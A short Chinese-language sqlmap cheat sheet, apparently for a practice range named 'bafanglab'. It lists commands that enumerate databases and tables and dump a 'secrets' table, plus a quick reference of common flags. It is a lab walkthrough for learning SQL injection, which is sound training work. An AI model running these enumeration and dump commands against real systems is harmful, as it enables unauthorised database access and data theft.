sqlmap（推荐）

SQL 注入自动化之王，支持 6 大注入类型、50+ 数据库、WAF 绕过。

# 基本语法（以 GET 注入为例）
sqlmap -u "?id=1" [options]

# 1. 爆所有数据库
sqlmap -u "?id=1" --dbs --batch

# 2. 指定数据库，列出所有表
sqlmap -u "?id=1" -D bafanglab --tables --batch

# 3. 导出 secrets 表数据（通关凭证）
sqlmap -u "?id=1" -D bafanglab -T secrets --dump --batch

本靶场实测：全部 5 种子注入类型（UNION/报错/布尔盲注/时间盲注/POST）均被 sqlmap 3 秒内自动识别并导出。当前库：bafanglab，目标表：secrets / users。

常用参数速查：

  • --dbs 爆所有库
  • -D dbname --tables 列出指定库的表
  • -D dbname -T tablename --dump 导出表数据
  • --data "POST=body" 指定 POST 数据
  • --technique=B/T/U/E/S/Q 只跑指定类型
  • --batch 自动确认所有交互
